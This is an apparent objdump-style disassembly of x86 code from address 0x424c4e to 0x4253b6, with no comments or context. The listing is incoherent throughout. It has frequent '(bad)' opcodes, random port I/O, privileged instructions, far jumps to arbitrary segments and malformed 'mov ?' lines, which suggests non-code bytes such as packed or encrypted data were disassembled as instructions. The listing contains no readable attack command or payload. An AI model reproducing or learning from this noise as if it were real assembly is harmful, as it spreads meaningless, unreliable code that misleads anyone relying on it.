  424c4e:	aaa    
  424c4f:	inc    edi
  424c50:	push   ecx
  424c51:	inc    edx
  424c52:	adc    DWORD PTR [edi+eax*4+0x34],edi
  424c56:	xor    al,BYTE PTR [esi+0x2d65285d]
  424c5c:	ja     0x424c3d
  424c5e:	lahf   
  424c5f:	mov    ds:0x7387871f,eax
  424c64:	push   cs
  424c65:	mul    DWORD PTR [edi+0x2c]
  424c68:	push   ds
  424c69:	outs   dx,DWORD PTR ds:[esi]
  424c6a:	pop    eax
  424c6b:	pop    ecx
  424c6c:	sahf   
  424c6d:	mov    dl,0xb4
  424c6f:	xor    ah,BYTE PTR [ecx-0x22]
  424c72:	mov    dh,0xec
  424c74:	ins    BYTE PTR es:[edi],dx
  424c75:	sahf   
  424c76:	sbb    DWORD PTR [edi-0x4],0x33
  424c7a:	cmp    al,0xf2
  424c7c:	xor    eax,0xbe87871f
  424c81:	sahf   
  424c82:	dec    ecx
  424c83:	jnp    0x424c1f
  424c85:	jecxz  0x424cf2
  424c87:	dec    ebx
  424c88:	push   esp
  424c89:	xchg   ebp,eax
  424c8a:	xor    BYTE PTR [ebx-0x26242633],bl
  424c90:	div    ebx
  424c92:	data16 xor al,0x93
  424c95:	or     DWORD PTR [ebx-0x5f],ecx
  424c98:	push   cs
  424c99:	adc    DWORD PTR [eax+0x1],0x8a4b7821
  424ca0:	inc    esp
  424ca1:	xlat   BYTE PTR ds:[ebx]
  424ca2:	fstp   DWORD PTR [edx-0x68]
  424ca5:	xlat   BYTE PTR ds:[ebx]
  424ca6:	sbb    bx,WORD PTR [esp+edi*1]
  424caa:	jle    0x424c76
  424cac:	dec    ebx
  424cad:	fcom   st(3)
  424caf:	(bad)  
  424cb0:	jb     0x424c3d
  424cb2:	mov    dh,0x17
  424cb4:	lods   eax,DWORD PTR ds:[esi]
  424cb5:	add    dh,bh
  424cb7:	hlt    
  424cb8:	cmp    esp,esi
  424cba:	jnp    0x424cbb
  424cbc:	out    0xd3,eax
  424cbe:	loope  0x424ce9
  424cc0:	dec    ebp
  424cc1:	cli    
  424cc2:	sub    cl,BYTE PTR [ebp+0x49]
  424cc5:	xor    al,0x26
  424cc7:	push   0x8d02270
  424ccc:	or     eax,0xadd4b109
  424cd1:	pop    ebx
  424cd3:	jg     0x424c8b
  424cd5:	or     eax,0x46ab07bf
  424cda:	and    DWORD PTR [edx-0x74270f34],edi
  424ce0:	rol    BYTE PTR [ecx-0x22],1
  424ce3:	inc    edi
  424ce4:	fist   DWORD PTR [eax-0x1d9e6b9a]
  424cea:	fimul  WORD PTR [esi-0x35]
  424ced:	retf   0x29f1
  424cf0:	mov    ebp,DWORD PTR [ebx]
  424cf2:	or     edx,DWORD PTR [eax]
  424cf4:	add    bl,BYTE PTR [ebx+0x26732e17]
  424cfa:	jge    0x424d23
  424cfc:	(bad)  
  424cfd:	mov    esi,0x7c716fe5
  424d02:	jbe    0x424ca2
  424d04:	and    DWORD PTR [esi-0x75],0x58
  424d08:	mov    ch,0xbc
  424d0a:	out    dx,al
  424d0b:	in     eax,0x6f
  424d0d:	loop   0x424ca4
  424d0f:	sar    ebx,cl
  424d11:	stc    
  424d12:	in     al,dx
  424d13:	xchg   edi,eax
  424d14:	ds retf 
  424d16:	pop    esi
  424d17:	jmp    DWORD PTR [eax+esi*8]
  424d1a:	jp     0x424cd6
  424d1c:	ds mov dl,0xbe
  424d1f:	mov    dh,0x0
  424d21:	add    esi,esp
  424d23:	pop    ebp
  424d24:	inc    esp
  424d25:	arpl   di,ax
  424d27:	pop    ds
  424d28:	(bad)  
  424d29:	call   0x243b:0xfe717077
  424d30:	lea    ebp,[esp+edx*2]
  424d33:	push   ebx
  424d34:	ror    DWORD PTR es:[ecx],cl
  424d37:	pop    edi
  424d38:	clc    
  424d39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d3a:	cmp    ebp,DWORD PTR [eax+0x37]
  424d3d:	sbb    edx,esi
  424d3f:	dec    esi
  424d40:	or     DWORD PTR [ecx+0x3d9ed9ed],esi
  424d46:	shr    ecx,0x33
  424d49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d4a:	jns    0x424d41
  424d4c:	pop    ds
  424d4d:	jle    0x424cd3
  424d4f:	push   ebx
  424d50:	dec    ebx
  424d51:	pop    ss
  424d52:	adc    BYTE PTR [esi],ah
  424d54:	cld    
  424d55:	in     al,dx
  424d56:	bsr    ebx,DWORD PTR [ebx-0x1ea33055]
  424d5d:	hlt    
  424d5e:	in     eax,dx
  424d5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d60:	pop    ecx
  424d61:	cmp    eax,0xcf50b136
  424d66:	inc    ecx
  424d67:	(bad)
  424d6b:	xchg   ecx,eax
  424d6c:	fimul  WORD PTR [ebx-0x5fd09592]
  424d72:	xor    ah,BYTE PTR [edx]
  424d74:	retf   0xc79e
  424d77:	xchg   edx,eax
  424d78:	pop    edi
  424d79:	shr    al,cl
  424d7b:	sbb    DWORD PTR [ecx+0x7f715f22],esi
  424d81:	sbb    al,0x5c
  424d83:	sbb    BYTE PTR [esi+esi*4+0x3682911a],0x75
  424d8b:	mov    ebp,0x20a46f32
  424d90:	dec    ebx
  424d91:	or     esi,DWORD PTR [eax+0x58f2e93c]
  424d97:	mov    ax,ds:0x4096bc95
  424d9d:	mov    cl,0x9b
  424d9f:	mov    ds:0x9f8d9a89,eax
  424da4:	arpl   WORD PTR [ebx],dx
  424da6:	(bad)  
  424da7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424da8:	in     al,0x49
  424daa:	pushf  
  424dab:	sub    eax,0x665865b6
  424db0:	fxch   st(5)
  424db2:	add    ch,BYTE PTR [ebx+0x56]
  424db5:	aas    
  424db6:	in     eax,0x5a
  424db8:	jg     0x424e31
  424dba:	pop    es
  424dbb:	push   es
  424dbc:	cmp    BYTE PTR ds:0x91d2d3ef,0x28
  424dc3:	sti    
  424dc4:	sti    
  424dc5:	inc    ebx
  424dc6:	rcl    DWORD PTR [eax-0x7d656ac1],0x54
  424dcd:	aas    
  424dce:	xchg   dl,dh
  424dd0:	les    ebx,FWORD PTR [ecx-0x4a]
  424dd3:	retf   
  424dd4:	add    ecx,DWORD PTR ds:0xa8c0abd3
  424dda:	out    0xa2,eax
  424ddc:	add    DWORD PTR [ecx+0x1d],0xffffffdc
  424de0:	hlt    
  424de1:	cdq    
  424de2:	push   eax
  424de3:	sahf   
  424de4:	push   ebx
  424de5:	pop    ebp
  424de6:	clc    
  424de7:	mov    esp,DWORD PTR [edx-0x6bbc0f37]
  424ded:	ret    
  424dee:	fst    QWORD PTR [esi-0x6ce6423d]
  424df4:	test   DWORD PTR [edx+0x5817c763],ecx
  424dfa:	aas    
  424dfb:	mov    bl,0xca
  424dfd:	out    dx,al
  424dfe:	lea    ebx,[ebp-0x56]
  424e01:	das    
  424e02:	jl     0x424e27
  424e04:	xor    BYTE PTR [edx+0x6ea53eb4],0x2
  424e0b:	cmp    esi,DWORD PTR [edi]
  424e0d:	push   cs
  424e0e:	cwde   
  424e0f:	int    0xbc
  424e11:	loope  0x424d97
  424e13:	lds    bx,DWORD PTR [ebp-0x356fa277]
  424e1a:	ds mov dl,0x32
  424e1d:	arpl   WORD PTR [ebx-0x76],bp
  424e20:	imul   ebx,DWORD PTR [edx+0x35],0xffffffa2
  424e24:	or     edi,DWORD PTR [ebx+0x4c]
  424e27:	into   
  424e28:	mov    ah,0xec
  424e2a:	std    
  424e2b:	(bad)  
  424e2c:	jns    0x424dd8
  424e2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e2f:	mov    ds,WORD PTR [edi+0x7df7d8f9]
  424e35:	xchg   esi,eax
  424e36:	pop    ebx
  424e37:	mov    ah,0xbd
  424e39:	push   0xef03f005
  424e3e:	jnp    0x424ddf
  424e40:	fdivrp st(5),st
  424e42:	adc    edi,edi
  424e44:	cmc    
  424e45:	scas   eax,DWORD PTR es:[edi]
  424e46:	jne    0x424df1
  424e48:	jnp    0x424eaf
  424e4a:	mov    bl,BYTE PTR [edx-0x6e]
  424e4d:	ins    DWORD PTR es:[edi],dx
  424e4e:	inc    edx
  424e4f:	or     BYTE PTR [eax+0x24343287],cl
  424e55:	cli    
  424e56:	mov    al,ds:0x963aaa5e
  424e5b:	loopne 0x424ec9
  424e5d:	stc    
  424e5e:	push   es
  424e5f:	mov    bl,0x36
  424e61:	into   
  424e62:	push   ds
  424e63:	into   
  424e64:	das    
  424e65:	scas   al,BYTE PTR es:[edi]
  424e66:	or     al,0x52
  424e68:	ficom  WORD PTR [edi-0x2]
  424e6b:	sbb    BYTE PTR [esi],ah
  424e6d:	cld    
  424e6e:	add    BYTE PTR [ebp-0x9f1aaff],dl
  424e74:	pop    edx
  424e75:	rol    BYTE PTR [eax-0x43],1
  424e78:	push   eax
  424e79:	mov    cl,0x36
  424e7b:	mov    ebx,0x1ffb2b97
  424e80:	out    0xeb,eax
  424e82:	fcomip st,st(6)
  424e84:	push   ds
  424e85:	push   ds
  424e86:	mov    edi,0xbbe645f4
  424e8b:	jnp    0x424e49
  424e8d:	out    0x9e,al
  424e8f:	push   edi
  424e90:	jo     0x424e87
  424e92:	cli    
  424e93:	xchg   edi,eax
  424e94:	mov    ecx,0xeebc2bb8
  424e99:	xchg   ebp,eax
  424e9a:	outs   dx,DWORD PTR ds:[esi]
  424e9b:	in     eax,0xc1
  424e9d:	daa    
  424e9e:	aas    
  424e9f:	ret    
  424ea0:	popf   
  424ea1:	(bad)  
  424ea2:	mov    esi,0x6ecfcb85
  424ea7:	jo     0x424ea7
  424ea9:	into   
  424eaa:	repz push 0xaf67cd82
  424eb0:	and    BYTE PTR [ebp-0x39],dh
  424eb3:	inc    ecx
  424eb4:	mov    bh,0xc5
  424eb6:	outs   dx,DWORD PTR ds:[esi]
  424eb7:	jle    0x424eaa
  424eb9:	add    DWORD PTR [ebx],edx
  424ebb:	int    0x5a
  424ebd:	or     bl,dl
  424ebf:	sar    ch,0xbb
  424ec2:	fisttp WORD PTR [ebx+esi*4-0x44]
  424ec6:	dec    edx
  424ec7:	adc    eax,DWORD PTR [edx]
  424ec9:	repz scas al,BYTE PTR es:[edi]
  424ecb:	gs lods eax,DWORD PTR gs:[esi]
  424ece:	addr16 out 0x4d,eax
  424ed1:	aas    
  424ed2:	(bad)  
  424ed3:	iret   
  424ed4:	aas    
  424ed5:	jle    0x424e70
  424ed7:	cmc    
  424ed8:	xchg   ebx,eax
  424ed9:	sub    DWORD PTR [edi+0x3e],0xff1616fb
  424ee0:	fmul   QWORD PTR [edi+0x7f93f870]
  424ee6:	test   DWORD PTR [ebx+0x66a07a17],ebp
  424eec:	jne    0x424edb
  424eee:	sbb    BYTE PTR [eax],cl
  424ef0:	dec    esp
  424ef1:	push   ss
  424ef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ef3:	sub    al,0x1f
  424ef5:	lahf   
  424ef6:	mov    al,0xbd
  424ef8:	fist   DWORD PTR [ecx+0x5]
  424efb:	popa   
  424efc:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  424efe:	mov    eax,ds:0xa2163ef
  424f03:	stos   DWORD PTR es:[edi],eax
  424f04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f05:	bound  ebp,QWORD PTR [edi-0x49]
  424f08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f09:	ins    DWORD PTR es:[edi],dx
  424f0a:	lods   eax,DWORD PTR ds:[esi]
  424f0b:	shl    BYTE PTR [eax],1
  424f0d:	scas   eax,DWORD PTR es:[edi]
  424f0e:	mov    ebp,0x462c1053
  424f13:	push   es
  424f14:	and    bh,BYTE PTR [eax-0x25]
  424f17:	mov    al,0x5c
  424f19:	sbb    eax,0xdc1e1a38
  424f1e:	sub    eax,0xfbc09186
  424f23:	clc    
  424f24:	sub    ecx,DWORD PTR [esi-0x3b1f8bf2]
  424f2a:	test   BYTE PTR [edx],dl
  424f2c:	push   es
  424f2d:	aam    0x6a
  424f2f:	mov    cl,bl
  424f31:	imul   esp,DWORD PTR [edx],0x73
  424f34:	xchg   dh,bl
  424f36:	call   0xaebd7d0e
  424f3b:	xchg   DWORD PTR [eax-0x7a],edx
  424f3e:	cwde   
  424f3f:	jge    0x424f77
  424f41:	rcr    BYTE PTR [edx-0x30],cl
  424f44:	jae    0x424ef7
  424f46:	cli    
  424f47:	leave  
  424f48:	test   DWORD PTR ds:0xe0ad76f5,esi
  424f4e:	adc    DWORD PTR [ebp-0x239f174],eax
  424f54:	add    al,dh
  424f56:	ret    0x885f
  424f59:	aad    0xbc
  424f5b:	das    
  424f5c:	mov    edi,0xcb0223f0
  424f61:	pusha  
  424f62:	mov    ebp,0x37313ff3
  424f67:	dec    eax
  424f68:	(bad)  
  424f69:	int    0xd
  424f6b:	inc    esi
  424f6c:	add    cl,BYTE PTR [esi]
  424f6e:	add    edi,DWORD PTR [edi-0x443d3adf]
  424f74:	and    dh,BYTE PTR [ecx+0x4b]
  424f77:	pop    edi
  424f78:	mov    ?,WORD PTR [ebp+0x1e]
  424f7b:	outs   dx,BYTE PTR ds:[esi]
  424f7c:	mov    eax,ds:0x9fe8b5ac
  424f81:	int    0xf
  424f83:	jnp    0x424f6b
  424f85:	mov    bl,0x5d
  424f87:	dec    esi
  424f88:	lods   al,BYTE PTR ds:[esi]
  424f89:	das    
  424f8a:	mov    dl,0x74
  424f8c:	ins    BYTE PTR es:[edi],dx
  424f8d:	rcl    DWORD PTR [ebp+ebp*4-0x12627a41],1
  424f94:	add    esp,esi
  424f96:	repz cmp DWORD PTR [ecx+0x35fa8373],edi
  424f9d:	xchg   edx,eax
  424f9e:	push   cs
  424f9f:	jae    0x424ffe
  424fa1:	inc    esp
  424fa2:	mov    al,ds:0xdcda6ab6
  424fa7:	xchg   ecx,eax
  424fa8:	sub    ah,bh
  424faa:	cmp    BYTE PTR [ebx+edi*2-0x77],dh
  424fae:	mov    ch,0x6b
  424fb0:	out    0x61,eax
  424fb2:	out    0x18,eax
  424fb4:	push   ebp
  424fb5:	push   ebp
  424fb6:	mov    ebp,0xe32026e8
  424fbb:	in     eax,dx
  424fbc:	inc    ebp
  424fbd:	sub    eax,DWORD PTR [eax]
  424fbf:	inc    esp
  424fc0:	loopne 0x425037
  424fc2:	dec    ebp
  424fc4:	iret   
  424fc5:	xor    bl,ch
  424fc7:	(bad)  
  424fc8:	adc    ebp,DWORD PTR [ebx-0x34]
  424fcb:	call   0x554bae07
  424fd0:	or     BYTE PTR [edx+edi*1+0x4480ab10],ah
  424fd7:	addr16 je 0x425025
  424fda:	popa   
  424fdb:	cli    
  424fdc:	sub    BYTE PTR [eax+edi*1],dl
  424fdf:	adc    bh,al
  424fe1:	rcr    esi,1
  424fe3:	shl    edx,0xfb
  424fe6:	jbe    0x424fbc
  424fe8:	clc    
  424fe9:	sbb    edi,DWORD PTR [ebp+esi*1-0x92dcac8]
  424ff0:	stc    
  424ff1:	rol    DWORD PTR [ecx+esi*1],cl
  424ff4:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  424ff6:	mov    bh,0x30
  424ff8:	fdivrp st(4),st
  424ffa:	sar    DWORD PTR [edi],1
  424ffc:	rol    BYTE PTR [ebx-0x65],0xf
  425000:	mov    dl,0x7a
  425002:	jmp    0x631f:0x9be3bcbd
  425009:	div    DWORD PTR [edi]
  42500b:	pop    esi
  42500c:	xchg   DWORD PTR [esi+0x7e],edi
  42500f:	mov    DWORD PTR [ecx],ecx
  425011:	(bad)  
  425012:	mov    eax,0xf08b6171
  425017:	mov    dl,0x47
  425019:	pop    eax
  42501a:	stc    
  42501b:	mov    dh,0xf
  42501d:	xor    edi,ebx
  42501f:	mov    DWORD PTR [edi-0x5f],ebp
  425022:	out    dx,eax
  425023:	and    edx,DWORD PTR [edi+0x2e]
  425026:	pop    esi
  425027:	and    ecx,edx
  425029:	xor    bh,BYTE PTR [ecx-0x11]
  42502c:	aas    
  42502d:	jecxz  0x425008
  42502f:	popf   
  425030:	sbb    ch,ch
  425032:	xor    BYTE PTR [ebx],cl
  425034:	popf   
  425035:	test   BYTE PTR [ebp+0x3a5109a5],al
  42503b:	add    BYTE PTR [esi+0x309bd932],0xe1
  425042:	repnz lea edi,ds:0xa0d15174
  425049:	jl     0x4250b3
  42504b:	jecxz  0x42504e
  42504d:	pop    esi
  42504e:	mov    ebx,0x3fc4b5f2
  425053:	sti    
  425054:	retf   
  425055:	ins    BYTE PTR es:[edi],dx
  425056:	fdivr  QWORD PTR [eax+0x5f23e1ce]
  42505c:	retf   
  42505d:	push   esi
  42505e:	call   0x81e7f0b
  425063:	pop    ss
  425064:	(bad)  
  425065:	pop    ecx
  425066:	cmp    esi,DWORD PTR [ebx+0x29a5b1ce]
  42506c:	repz pop ecx
  42506e:	retf   
  42506f:	ror    DWORD PTR [esi-0x39],0x8d
  425073:	int    0x2d
  425075:	ret    0x8889
  425078:	out    dx,al
  425079:	aam    0xac
  42507b:	sahf   
  42507c:	pop    edx
  42507d:	out    0xd8,eax
  42507f:	repnz xchg esp,eax
  425081:	jmp    0x4250f6
  425083:	pop    edi
  425084:	aad    0x32
  425086:	sti    
  425087:	mov    DWORD PTR [ecx],ebp
  425089:	mov    ds:0x39a4ac04,eax
  42508e:	push   ecx
  42508f:	mov    edx,0x753cd90e
  425094:	adc    al,0x25
  425096:	fsubrp st(7),st
  425098:	das    
  425099:	jno    0x4250af
  42509b:	xor    eax,0xe029c115
  4250a0:	xlat   BYTE PTR ds:[ebx]
  4250a1:	xchg   esp,eax
  4250a2:	dec    eax
  4250a3:	sbb    al,BYTE PTR [esi-0x679bc2b1]
  4250a9:	sbb    BYTE PTR [eax+eax*1+0x5d19c2e],dl
  4250b0:	mov    edx,0xa3237390
  4250b5:	call   0xd5b8:0x25c2fe5d
  4250bc:	aaa    
  4250bd:	loope  0x4250dd
  4250bf:	test   DWORD PTR [esi],eax
  4250c1:	pop    ebp
  4250c2:	mov    eax,0x1caedb72
  4250c7:	add    dh,BYTE PTR [esp+edx*1]
  4250ca:	xchg   ecx,eax
  4250cb:	lods   eax,DWORD PTR ds:[esi]
  4250cc:	mov    ds:0xba0840e,eax
  4250d1:	cdq    
  4250d2:	push   ebx
  4250d3:	jge    0x4250ba
  4250d5:	fistp  WORD PTR [ecx-0x45]
  4250d8:	gs add eax,0x85b84477
  4250de:	loop   0x42514e
  4250e0:	or     bh,BYTE PTR [ecx-0x34]
  4250e3:	mov    ss,WORD PTR [edx+0x41fb237d]
  4250e9:	pop    ecx
  4250ea:	rcl    DWORD PTR [edx+0x29],cl
  4250ed:	jge    0x4250eb
  4250ef:	mov    esi,DWORD PTR [esi]
  4250f1:	sub    bl,BYTE PTR [ecx-0x7f]
  4250f4:	fld    DWORD PTR [edx+0x39]
  4250f7:	aas    
  4250f8:	mov    ds:0x8e0a0efe,al
  4250fd:	mov    al,0xfd
  4250ff:	aaa    
  425100:	scas   al,BYTE PTR es:[edi]
  425101:	out    dx,eax
  425102:	xor    esp,DWORD PTR [ecx+eiz*1]
  425105:	in     eax,0xaa
  425107:	aas    
  425108:	pop    edi
  425109:	mov    al,ds:0x11215356
  42510e:	mov    bl,0x57
  425110:	and    ah,dl
  425112:	int    0x6a
  425114:	inc    ebp
  425115:	sub    al,0x7f
  425117:	es pop eax
  425119:	add    al,0xa9
  42511b:	in     al,0x75
  42511d:	test   al,0xb2
  42511f:	cmp    BYTE PTR [ecx],bh
  425121:	rcl    DWORD PTR [ebx-0x1a678561],0xd9
  425128:	fstp   QWORD PTR [esi+ebp*2]
  42512b:	in     eax,dx
  42512c:	jg     0x4250b6
  42512e:	pop    ebx
  42512f:	mov    eax,0x5af0bd
  425134:	fild   QWORD PTR [esi]
  425136:	pop    ebp
  425137:	mov    edx,0xf1cdcba4
  42513c:	iret   
  42513d:	mov    al,ds:0xaa4fa5a9
  425142:	sbb    DWORD PTR [edx-0x7ba8afd6],edi
  425148:	stos   BYTE PTR es:[edi],al
  425149:	and    al,BYTE PTR [eax+eax*2-0x49d66af8]
  425150:	fsubr  QWORD PTR [ebx+eiz*2]
  425153:	je     0x4250e3
  425155:	or     DWORD PTR [edi],0xd7cfaf10
  42515b:	xor    ah,ah
  42515d:	jecxz  0x4251c1
  42515f:	mov    ds:0xeb3375b1,al
  425164:	aaa    
  425165:	cmp    BYTE PTR [esi+0x63],0x4d
  425169:	loope  0x425119
  42516b:	les    edi,FWORD PTR [esi+eiz*2+0x2b]
  42516f:	pop    edi
  425170:	lods   al,BYTE PTR ds:[esi]
  425171:	sbb    al,0x5f
  425173:	loopne 0x425139
  425175:	leave  
  425176:	adc    ebx,DWORD PTR [edi+eiz*8+0x553c1ced]
  42517d:	repz lock das 
  425180:	scas   al,BYTE PTR es:[edi]
  425181:	jb     0x425164
  425183:	jmp    0xc9c9:0xdc4ed605
  42518a:	xchg   ebx,eax
  42518b:	daa    
  42518c:	fnstcw WORD PTR [edx+0x4fddc3b4]
  425192:	jmp    DWORD PTR ds:0x4c23d976
  425198:	pop    edx
  425199:	ss sahf 
  42519b:	mov    ebp,0xae5dd44c
  4251a0:	jg     0x42519f
  4251a2:	psllw  mm7,mm2
  4251a5:	push   edi
  4251a6:	faddp  st(5),st
  4251a8:	ret    
  4251a9:	dec    edi
  4251aa:	aas    
  4251ab:	in     al,dx
  4251ac:	xchg   ebx,eax
  4251ad:	inc    ebp
  4251ae:	xchg   bh,bl
  4251b0:	xor    ah,bl
  4251b2:	cli    
  4251b3:	in     eax,0xb
  4251b5:	pop    esp
  4251b6:	jp     0x42522a
  4251b8:	sub    DWORD PTR [ebx+0xd103797],0xffffffcc
  4251bf:	daa    
  4251c0:	jae    0x4251d8
  4251c2:	xlat   BYTE PTR ds:[ebx]
  4251c3:	add    dh,bl
  4251c5:	or     BYTE PTR [ebx],bh
  4251c7:	push   edi
  4251c8:	pop    edx
  4251c9:	(bad)  
  4251ca:	fst    QWORD PTR [ebx-0x11244df1]
  4251d0:	jno    0x4251b1
  4251d2:	cdq    
  4251d3:	cmp    edi,DWORD PTR [ecx-0x5]
  4251d6:	mov    bh,0x6c
  4251d8:	repnz out dx,al
  4251da:	div    DWORD PTR [esi-0x60310664]
  4251e0:	and    BYTE PTR [ebp+edi*2+0x572bad9a],bl
  4251e7:	cmp    ah,bl
  4251e9:	cmp    esp,DWORD PTR [eax+0x6b]
  4251ec:	arpl   WORD PTR [ebx+0x4cf3eaad],dx
  4251f2:	pop    edi
  4251f3:	sti    
  4251f4:	sbb    BYTE PTR [edi-0x14],bh
  4251f7:	scas   eax,DWORD PTR es:[edi]
  4251f8:	call   FWORD PTR [edx]
  4251fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251fb:	pop    esi
  4251fc:	jg     0x425187
  4251fe:	in     eax,dx
  4251ff:	stos   DWORD PTR es:[edi],eax
  425200:	fwait
  425201:	push   0x5b5f582
  425206:	inc    ebx
  425207:	push   edx
  425208:	mov    eax,0x2cc27462
  42520d:	mov    esp,?
  42520f:	push   0xe71f951d
  425214:	stos   BYTE PTR es:[edi],al
  425215:	bound  esp,QWORD PTR ds:[edx]
  425218:	cmc    
  425219:	mov    eax,ds:0xbe72b85d
  42521f:	(bad)  
  425220:	shl    BYTE PTR [edx],1
  425222:	retf   
  425223:	jge    0x425218
  425225:	pop    esp
  425226:	test   eax,0x2536d98
  42522b:	jp     0x425288
  42522d:	clc    
  42522e:	xchg   esp,eax
  42522f:	cwde   
  425230:	dec    eax
  425231:	popf   
  425232:	das    
  425233:	ds jmp 0x339c:0xd3c93b89
  42523b:	inc    ecx
  42523c:	xchg   edi,eax
  42523d:	mov    edi,edi
  42523f:	(bad)  {k3}{z}
  425244:	push   esi
  425245:	ins    BYTE PTR es:[edi],dx
  425246:	or     esp,DWORD PTR [ecx-0x74b9675a]
  42524c:	jo     0x4251f2
  42524e:	xchg   edx,eax
  42524f:	pop    esp
  425250:	xchg   ebp,eax
  425251:	aam    0xce
  425253:	xchg   edi,eax
  425254:	xchg   ebx,eax
  425255:	addr16 push edx
  425257:	mov    ecx,0xc9ea2f27
  42525c:	jle    0x42521c
  42525e:	out    0xb2,al
  425260:	ins    BYTE PTR es:[edi],dx
  425261:	cmp    DWORD PTR [edx],ebp
  425263:	call   0x48291989
  425268:	aas    
  425269:	ret    0x2f28
  42526c:	int3   
  42526d:	test   BYTE PTR [eax-0x6e79a38c],bh
  425273:	jg     0x425244
  425275:	call   0x9348d5d6
  42527a:	jo     0x42524f
  42527c:	jle    0x425297
  42527e:	adc    DWORD PTR [ecx+0x332130de],esi
  425284:	sub    al,0x52
  425286:	xchg   esp,eax
  425287:	mov    bh,BYTE PTR [ecx-0x4194dee5]
  42528d:	adc    DWORD PTR [ecx-0x58],ebx
  425290:	or     al,0x49
  425292:	fs inc edi
  425294:	fcom   QWORD PTR ds:0xa6b32619
  42529a:	push   esp
  42529b:	mov    ah,bh
  42529d:	inc    esp
  42529e:	add    ah,BYTE PTR [ecx-0x5ff31bcf]
  4252a4:	sub    edx,edx
  4252a6:	(bad)  
  4252a7:	dec    eax
  4252a8:	aad    0x8
  4252aa:	(bad)  
  4252ab:	scas   eax,DWORD PTR es:[edi]
  4252ac:	jg     0x4252bb
  4252ae:	add    DWORD PTR [esi-0x55],0xf7f87e10
  4252b5:	xchg   ebx,eax
  4252b6:	leave  
  4252b7:	scas   eax,DWORD PTR es:[edi]
  4252b8:	xchg   bx,ax
  4252ba:	dec    ebx
  4252bb:	xchg   edi,eax
  4252bc:	pop    esi
  4252bd:	jl     0x425303
  4252bf:	loope  0x42529d
  4252c1:	ins    DWORD PTR es:[edi],dx
  4252c2:	mov    bh,0xc9
  4252c4:	sbb    eax,0xdff5fdf7
  4252c9:	push   esp
  4252ca:	loope  0x425299
  4252cc:	aad    0x42
  4252ce:	adc    esp,DWORD PTR [esi]
  4252d0:	dec    ebx
  4252d1:	or     edx,esp
  4252d3:	mov    edx,DWORD PTR [ebx]
  4252d5:	add    dl,al
  4252d7:	mov    bh,0x3d
  4252d9:	std    
  4252da:	inc    ecx
  4252db:	inc    edi
  4252dc:	aaa    
  4252dd:	outs   dx,DWORD PTR ds:[esi]
  4252de:	dec    ecx
  4252df:	popf   
  4252e0:	push   edx
  4252e1:	xor    BYTE PTR [edi],bl
  4252e3:	sbb    ebx,ebp
  4252e5:	out    0x46,eax
  4252e7:	sbb    DWORD PTR [esi+0x3b],ebx
  4252ea:	loopne 0x425369
  4252ec:	mov    edx,0xcf7b734d
  4252f1:	outs   dx,BYTE PTR ds:[esi]
  4252f2:	sub    dh,BYTE PTR [edx-0x3c]
  4252f5:	inc    eax
  4252f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252f7:	jb     0x425378
  4252f9:	mov    ecx,0xf0c363f2
  4252fe:	pop    ebx
  4252ff:	mov    dl,0xef
  425301:	fs lahf 
  425303:	sbb    ebx,esp
  425305:	push   ds
  425306:	pop    eax
  425307:	pop    esp
  425308:	sahf   
  425309:	and    BYTE PTR [edx-0x4f],dl
  42530c:	mov    al,0xd8
  42530e:	shl    BYTE PTR [edi+0x4433f17d],1
  425314:	test   BYTE PTR [edx+0x52],ch
  425317:	mov    ds:0xf4b2b949,eax
  42531c:	sub    DWORD PTR [esi],edx
  42531e:	fdivp  st(2),st
  425320:	sbb    DWORD PTR [esi-0x385e6561],esi
  425326:	mov    bh,0x58
  425328:	mov    eax,0xd3d6f23b
  42532d:	scas   eax,DWORD PTR es:[edi]
  42532e:	out    0x97,eax
  425330:	pop    ds
  425331:	call   FWORD PTR [eax]
  425333:	repz mov ebp,0xe155e60e
  425339:	ss ret 0xf024
  42533d:	into   
  42533e:	xlat   BYTE PTR ds:[ebx]
  42533f:	mov    esp,0x7ff7078d
  425344:	fwait
  425345:	stc    
  425346:	adc    DWORD PTR [ebx-0x32],0xffffffbe
  42534a:	popa   
  42534b:	mov    DWORD PTR [ebx-0x3f0e51b1],edi
  425351:	test   bl,0xb4
  425354:	jge    0x425378
  425356:	ins    DWORD PTR es:[edi],dx
  425357:	inc    ebp
  425358:	push   edx
  425359:	fwait
  42535a:	test   al,0xab
  42535c:	inc    ebp
  42535d:	push   ss
  42535e:	ret    0x7d12
  425361:	xlat   BYTE PTR ds:[ebx]
  425362:	shl    BYTE PTR [esi],cl
  425364:	jae    0x425300
  425366:	imul   eax,ebp,0xc3dfcfab
  42536c:	mov    ebp,0xf1f14fc7
  425371:	lahf   
  425372:	jp     0x4253a9
  425374:	cmp    al,0xfd
  425376:	jb     0x425310
  425378:	and    al,0xbe
  42537a:	out    dx,al
  42537b:	mov    edi,0xb6b2cfa
  425380:	or     eax,0xb4ccb84d
  425385:	aas    
  425386:	retf   
  425387:	dec    edi
  425388:	(bad)  
  425389:	in     eax,dx
  42538a:	mov    bh,0x12
  42538c:	mov    ah,0xe6
  42538e:	int3   
  42538f:	popf   
  425390:	addr16 or cl,al
  425393:	fimul  DWORD PTR [esi-0x13]
  425396:	ins    BYTE PTR es:[edi],dx
  425397:	pop    ebx
  425398:	fnstenv [ebx-0x74]
  42539b:	and    edx,DWORD PTR [edi+0x20]
  42539e:	push   eax
  42539f:	dec    esp
  4253a0:	out    dx,al
  4253a1:	adc    esp,esp
  4253a3:	test   BYTE PTR [ecx],ah
  4253a5:	lods   eax,DWORD PTR ds:[esi]
  4253a6:	lods   al,BYTE PTR ds:[esi]
  4253a7:	cmp    BYTE PTR [edx],dh
  4253a9:	push   esp
  4253aa:	int    0x7c
  4253ac:	push   esi
  4253ad:	not    BYTE PTR [edx-0x4e7ed2c3]
  4253b3:	inc    ebp
  4253b4:	xor    cl,al
  4253b6:	lahf   
